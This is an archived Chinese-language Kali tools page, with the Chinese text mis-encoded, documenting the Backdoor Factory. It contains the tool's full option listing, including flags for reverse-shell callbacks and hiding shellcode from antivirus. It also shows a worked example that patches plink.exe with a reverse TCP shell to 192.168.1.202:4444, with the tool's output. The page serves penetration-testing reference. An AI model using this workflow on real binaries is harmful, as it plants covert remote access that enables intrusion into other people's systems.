<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<title>kaliå·¥å…·ç®±</title>
<script src="bootstrap.min.js" tppabs="http://www.storysec.com/kali/kalitools/static/bootstrap.min.js"></script>
<link rel="stylesheet" href="main.css" tppabs="http://www.storysec.com/kali/kalitools/static/main.css">
<link rel="stylesheet" href="bootstrap.min.css" tppabs="http://www.storysec.com/kali/kalitools/static/bootstrap.min.css">
<style type="text/css" id="syntaxhighlighteranchor"></style>
</head>
<main class="main-container ng-scope" ng-view="">
<div class="main receptacle post-view ng-scope">
<article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox="">
<section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml">
<h2>åé—¨å‚åŒ…è£…è¯´æ˜</h2><p style="text-align: justify;"> BDFçš„ç›®æ ‡æ˜¯ä¿®è¡¥ç¨‹åºå¯æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸ç”¨æˆ·desideredçš„shellcodeå¹¶ä¸æ–­çš„ä¿®è¡¥å‰çš„çŠ¶æ€æ­£å¸¸æ‰§è¡Œã€‚ </p><p>æ”¯æŒï¼šWindows PEçš„X32 / X64å’ŒLinux ELF X32 / X64ï¼ˆç³»ç»ŸVï¼‰ </p><p>ä¸€äº›å¯æ‰§è¡Œæ–‡ä»¶æœ‰å†…ç½®çš„ä¿æŠ¤ï¼Œå› ä¸ºåœ¨æ‰€æœ‰çš„äºŒè¿›åˆ¶æ–‡ä»¶è¿™ä¸€ç­‰å°†æ— æ³•æ­£å¸¸å·¥ä½œã€‚é‡è¦çš„æ˜¯ï¼Œæ‚¨å°†å®ƒä»¬éƒ¨ç½²åˆ°å®¢æˆ·ç«¯æˆ–åˆ©ç”¨ä»–ä»¬åœ¨æ¼”ä¹ ä¹‹å‰æµ‹è¯•çš„ç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶æ˜¯æ˜æ™ºçš„ã€‚ </p><p>èµ„æ–™æ¥æºï¼šhttps://github.com/secretsquirrel/the-backdoor-factory/ <br> <a href="javascript:if(confirm('https://github.com/secretsquirrel/the-backdoor-factory/  \n\n¸ÃÎÄ¼şÎŞ·¨ÓÃ Teleport Ultra ÏÂÔØ, ÒòÎª ËüÊÇÒ»¸öÓò»òÂ·¾¶Íâ²¿±»ÉèÖÃÎªËüµÄÆôÊ¼µØÖ·µÄµØÖ·¡£  \n\nÄãÏëÔÚ·şÎñÆ÷ÉÏ´ò¿ªËü?'))window.location='https://github.com/secretsquirrel/the-backdoor-factory/'" tppabs="https://github.com/secretsquirrel/the-backdoor-factory/" variation="deepblue" target="blank">å€Ÿå£³å·¥å‚é¦–é¡µ</a> - <a href="javascript:if(confirm('http://git.kali.org/gitweb/?p=packages/backdoor-factory.git;a=summary  \n\n¸ÃÎÄ¼şÎŞ·¨ÓÃ Teleport Ultra ÏÂÔØ, ÒòÎª ËüÊÇÒ»¸öÓò»òÂ·¾¶Íâ²¿±»ÉèÖÃÎªËüµÄÆôÊ¼µØÖ·µÄµØÖ·¡£  \n\nÄãÏëÔÚ·şÎñÆ÷ÉÏ´ò¿ªËü?'))window.location='http://git.kali.org/gitweb/?p=packages/backdoor-factory.git;a=summary'" tppabs="http://git.kali.org/gitweb/?p=packages/backdoor-factory.git;a=summary" variation="deepblue" target="blank">å¡åˆ©åé—¨å·¥å‚å›è´­</a> </p><ul><li>ä½œè€…ï¼šçº¦ä¹¦äºšÂ·çš®èŒ¨</li><li>è®¸å¯ï¼šGPLv3çš„</li></ul><h3>åŒ…æ‹¬åœ¨åé—¨å·¥å‚å°è£…å·¥å…·</h3><h5>å€Ÿå£³å·¥å‚ - è¡¥ä¸çš„win32 / 64äºŒè¿›åˆ¶æ–‡ä»¶çš„shellcode </h5><code><a class="__cf_email__" href="javascript:if(confirm('http://www.storysec.com/cdn-cgi/l/email-protection  \n\n¸ÃÎÄ¼şÎŞ·¨ÓÃ Teleport Ultra ÏÂÔØ, ÒòÎª ËüÊÇÒ»¸öÓò»òÂ·¾¶Íâ²¿±»ÉèÖÃÎªËüµÄÆôÊ¼µØÖ·µÄµØÖ·¡£  \n\nÄãÏëÔÚ·şÎñÆ÷ÉÏ´ò¿ªËü?'))window.location='http://www.storysec.com/cdn-cgi/l/email-protection'" tppabs="http://www.storysec.com/cdn-cgi/l/email-protection" data-cfemail="2c5e4343586c474d4045">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~# backdoor-factory<br>
-.(`-') Â (`-') Â _ Â  Â  Â  Â  Â  &lt;-.(`-') _(`-') Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â (`-')<br>
__( OO) Â (OO ).-/ Â _ Â  Â  Â  Â  __( OO)( (OO ).-&gt; Â  Â  .-&gt; Â  Â  Â  Â .-&gt; Â  &lt;-.(OO )<br>
'-'---.\ Â / ,---. Â  \-,-----.'-'. ,--.\ Â  Â .'_ (`-')----. (`-')----. ,------,)<br>
| .-. (/ Â | \ /`.\ Â  | Â .--./| Â .' Â  /'`'-..__)( OO).-. Â '( OO).-. Â '| Â  /`. '<br>
| '-' `.) '-'|_.' | /_) (`-')| Â  Â  Â /)| Â | Â ' |( _) | | Â |( _) | | Â || Â |_.' |<br>
| /`'. Â |(| Â .-. Â | || Â |OO )| Â . Â  ' | Â | Â / : \| Â |)| Â | \| Â |)| Â || Â . Â  .'<br>
| '--' Â / | Â | | Â |(_' Â '--'\| Â |\ Â  \| Â '-' Â / Â ' Â '-' Â ' Â ' Â '-' Â '| Â |\ Â \<br>
`------' Â `--' `--' Â  `-----'`--' '--'`------' Â  Â `-----' Â  Â `-----' `--' '--'<br>
Â  Â  Â  Â  Â  Â (`-') Â _ Â  Â  Â  Â  Â  (`-') Â  Â  Â  Â  Â  Â  Â  Â  Â  (`-')<br>
Â  Â &lt;-. Â  Â  (OO ).-/ Â _ Â  Â  Â  Â ( OO).-&gt; Â  Â  Â  .-&gt; Â  &lt;-.(OO ) Â  Â  Â .-&gt;<br>
(`-')-----./ ,---. Â  \-,-----./ Â  Â '._ Â (`-')----. ,------,) ,--.' Â ,-.<br>
(OO|(_\---'| \ /`.\ Â  | Â .--./|'--...__)( OO).-. Â '| Â  /`. '(`-')'.' Â /<br>
Â / | Â '--. '-'|_.' | /_) (`-')`--. Â .--'( _) | | Â || Â |_.' |(OO \ Â  Â /<br>
Â \_) Â .--'(| Â .-. Â | || Â |OO ) Â  | Â | Â  Â \| Â |)| Â || Â . Â  .' | Â / Â  /)<br>
Â  `| Â |_) Â | Â | | Â |(_' Â '--'\ Â  | Â | Â  Â  ' Â '-' Â '| Â |\ Â \ Â `-/ Â  /`<br>
Â  Â `--' Â  Â `--' `--' Â  `-----' Â  `--' Â  Â  Â `-----' `--' '--' Â  `--'<br>
<br>
Â  Â  Â  Â  Â Author: Â  Â Joshua Pitts<br>
Â  Â  Â  Â  Â Email: Â  Â  the.midnite.runr[a t]gmail&lt;d o t&gt;com<br>
Â  Â  Â  Â  Â Twitter: Â  @midnite_runr<br>
<br>
Â  Â  Â  Â  Â v2.0.6<br>
<br>
Usage: backdoor.py [options]<br>
<br>
Options:<br>
Â  -h, --help Â  Â  Â  Â  Â  Â show this help message and exit<br>
Â  -f FILE, --file=FILE Â File to backdoor<br>
Â  -s SHELL, --shell=SHELL<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Payloads that are available for use.<br>
Â  -H HOST, --hostip=HOST<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  IP of the C2 for reverse connections<br>
Â  -P PORT, --port=PORT Â The port to either connect back to for reverse shells<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  or to listen on for bind shells<br>
Â  -J, --cave_jumping Â  Â Select this options if you want to use code cave<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  jumping to further hide your shellcode in the binary.<br>
Â  -a, --add_new_section<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Mandating that a new section be added to the exe<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  (better success) but less av avoidance<br>
Â  -U SUPPLIED_SHELLCODE, --user_shellcode=SUPPLIED_SHELLCODE<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  User supplied shellcode, make sure that it matches the<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  architecture that you are targeting.<br>
Â  -c, --cave Â  Â  Â  Â  Â  Â The cave flag will find code caves that can be used<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  for stashing shellcode. This will print to all the<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  code caves of a specific size.The -l flag can be use<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  with this setting.<br>
Â  -l SHELL_LEN, --shell_length=SHELL_LEN<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  For use with -c to help find code caves of different<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  sizes<br>
Â  -o OUTPUT, --output-file=OUTPUT<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  The backdoor output file<br>
Â  -n NSECTION, --section=NSECTION<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  New section name must be less than seven characters<br>
Â  -d DIR, --directory=DIR<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  This is the location of the files that you want to<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  backdoor. You can make a directory of file backdooring<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  faster by forcing the attaching of a codecave to the<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  exe by using the -a setting.<br>
Â  -w, --change_access Â  This flag changes the section that houses the codecave<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  to RWE. Sometimes this is necessary. Enabled by<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  default. If disabled, the backdoor may fail.<br>
Â  -i, --injector Â  Â  Â  Â This command turns the backdoor factory in a hunt and<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  shellcode inject type of mechinism. Edit the target<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  settings in the injector module.<br>
Â  -u SUFFIX, --suffix=SUFFIX<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  For use with injector, places a suffix on the original<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  file for easy recovery<br>
Â  -D, --delete_original<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  For use with injector module. Â This command deletes<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  the original file. Â Not for use in production systems.<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  *Author not responsible for stupid uses.*<br>
Â  -O DISK_OFFSET, --disk_offset=DISK_OFFSET<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Starting point on disk offset, in bytes. Some authors<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  want to obfuscate their on disk offset to avoid<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  reverse engineering, if you find one of those files<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  use this flag, after you find the offset.<br>
Â  -S, --support_check Â  To determine if the file is supported by BDF prior to<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  backdooring the file. For use by itself or with<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  verbose. This check happens automatically if the<br>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  backdooring is attempted.<br>
Â  -q, --no_banner Â  Â  Â  Kills the banner.<br>
Â  -v, --verbose Â  Â  Â  Â  For debug information output.</code><h3>å€Ÿå£³å·¥å‚ç”¨æ³•ç¤ºä¾‹</h3><p>æŒ‡å®šäºŒå€Ÿå£³<b><i>ï¼ˆ-f /usr/share/windows-binaries/plink.exeï¼‰ï¼Œ</i></b>è®¾ç½®è¿æ¥å›<b><i>IPï¼ˆ-H 192.168.1.202ï¼‰ï¼Œ</i></b>åœ¨è¿æ¥å›ç«¯å£<b><i>ï¼ˆ-P 4444ï¼‰ï¼Œ</i></b>å’Œå¤–å£³ä½¿ç”¨<b><i>ï¼ˆ-s reverse_shell_tcpï¼‰ï¼š</i></b> </p><code><a class="__cf_email__" href="javascript:if(confirm('http://www.storysec.com/cdn-cgi/l/email-protection  \n\n¸ÃÎÄ¼şÎŞ·¨ÓÃ Teleport Ultra ÏÂÔØ, ÒòÎª ËüÊÇÒ»¸öÓò»òÂ·¾¶Íâ²¿±»ÉèÖÃÎªËüµÄÆôÊ¼µØÖ·µÄµØÖ·¡£  \n\nÄãÏëÔÚ·şÎñÆ÷ÉÏ´ò¿ªËü?'))window.location='http://www.storysec.com/cdn-cgi/l/email-protection'" tppabs="http://www.storysec.com/cdn-cgi/l/email-protection" data-cfemail="72001d1d063219131e1b">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~# backdoor-factory -f /usr/share/windows-binaries/plink.exe -H 192.168.1.202 -P 4444 -s reverse_shell_tcp<br>
__________ Â  Â  Â  Â  Â  Â  Â  Â __ Â  Â  Â  .___ Â  Â  Â  Â  Â  Â  Â  Â  Â  <br>
\______ Â  \_____ Â  Â ____ | Â | __ __| _/____ Â  ___________ <br>
Â | Â  Â | Â _/\__ Â \ _/ ___\| Â |/ // __ |/ Â _ \ / Â _ \_ Â __ \ <br>
Â | Â  Â | Â  \ / __ \\ Â \___| Â  Â &lt;/ /_/ ( Â &lt;_&gt; | Â &lt;_&gt; ) Â | \/<br>
Â |______ Â /(____ Â /\___ Â &gt;__|_ \____ |\____/ \____/|__| Â  <br>
Â  Â  Â  Â  \/ Â  Â  Â \/ Â  Â  \/ Â  Â  \/ Â  Â \/ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â <br>
___________ Â  Â  Â  Â  Â  Â  Â __ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <br>
\_ Â  _____/____ Â  Â _____/ Â |_ Â ___________ ___.__. Â  Â  Â  Â <br>
Â | Â  Â __) \__ Â \ _/ ___\ Â  __\/ Â _ \_ Â __ &lt; Â  | Â | Â  Â  Â  Â <br>
Â | Â  Â  \ Â  / __ \\ Â \___| Â | ( Â &lt;_&gt; ) Â | \/\___ Â | Â  Â  Â  Â <br>
Â \___ Â / Â (____ Â /\___ Â &gt;__| Â \____/|__| Â  / ____| Â  Â  Â  Â <br>
Â  Â  Â \/ Â  Â  Â  Â \/ Â  Â  \/ Â  Â  Â  Â  Â  Â  Â  Â  Â  \/ Â  Â  Â  Â  Â  Â  <br>
<br>
Â  Â  Â  Â  Â Author: Â  Â Joshua Pitts<br>
Â  Â  Â  Â  Â Email: Â  Â  the.midnite.runr[a t]gmail&lt;d o t&gt;com<br>
Â  Â  Â  Â  Â Twitter: Â  @midnite_runr<br>
Â  Â  Â  Â  Â <br>
Â  Â  Â  Â  Â v2.0.6 <br>
Â  Â  Â  Â  Â <br>
[*] In the backdoor module<br>
[*] Checking if binary is supported<br>
[*] Gathering file info<br>
[*] Reading win32 entry instructions<br>
[*] Looking for and setting selected shellcode<br>
[*] Creating win32 resume execution stub<br>
[*] Looking for caves that will fit the minimum shellcode length of 358<br>
[*] All caves lengths: Â (358,)<br>
############################################################<br>
The following caves can be used to inject code and possibly<br>
continue execution.<br>
**Don't like what you see? Use jump, single, or append.**<br>
############################################################<br>
[*] Cave 1 length as int: 358<br>
[*] Available caves: <br>
1. Section Name: None; Section Begin: None End: None; Cave begin: 0x280 End: 0x1000; Cave Size: 3456<br>
2. Section Name: .text; Section Begin: 0x1000 End: 0x37000; Cave begin: 0x36981 End: 0x37000; Cave Size: 1663<br>
3. Section Name: None; Section Begin: None End: None; Cave begin: 0x47cec End: 0x48004; Cave Size: 792<br>
4. Section Name: .data; Section Begin: 0x48000 End: 0x4a000; Cave begin: 0x48961 End: 0x48b90; Cave Size: 559<br>
5. Section Name: None; Section Begin: None End: None; Cave begin: 0x4907c End: 0x4a00e; Cave Size: 3986<br>
**************************************************<br>
[!] Enter your selection: 2<br>
Using selection: 2<br>
[*] Changing Section Flags<br>
[*] Patching initial entry instructions<br>
[*] Creating win32 resume execution stub<br>
[*] /usr/share/windows-binaries/plink.exe backdooring complete<br>
File /usr/share/windows-binaries/plink.exe is in the 'backdoored' directory</code><div style="display:none">
<script src="z_stat.php-id=1260038378&web_id=1260038378" tppabs="http://s11.cnzz.com/z_stat.php?id=1260038378&web_id=1260038378" language="JavaScript"></script>
</div>
</main></body></html>
